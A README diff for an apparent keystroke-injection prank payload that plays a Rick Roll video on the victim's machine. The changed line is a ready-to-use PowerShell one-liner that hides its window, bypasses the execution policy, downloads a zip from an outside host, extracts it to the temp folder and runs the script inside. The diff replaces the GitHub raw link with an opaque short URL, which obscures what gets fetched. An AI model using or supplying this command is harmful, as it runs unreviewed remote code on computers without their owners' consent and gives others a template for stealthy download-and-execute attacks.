@@ -44,7 +44,7 @@ A Rick Roll video is downloaded and played in your powershell console when a mou
 * Plug in your device
 * Invoke-WebRequest will be entered in the Run Box to download and execute the dependencies and payload
 ```
-powershell -w h -NoP -NonI -Ep Bypass $D="$env:tmp";iwr -Uri 'https://github.com/I-Am-Jakoby/I-Am-Jakoby/raw/main/Assets/rr.zip' -O "$D\rr.zip";Expand-Archive "$D\rr.zip" -Des $D\rr -Force;. "$D\rr\rr.ps1"
+powershell -w h -NoP -NonI -Ep Bypass $D="$env:tmp";iwr -Uri 'https://jakoby.lol/qee' -O "$D\rr.zip";Expand-Archive "$D\rr.zip" -Des $D\rr -Force;. "$D\rr\rr.ps1"
 ```
 
 <p align="right">(<a href="#top">back to top</a>)</p>
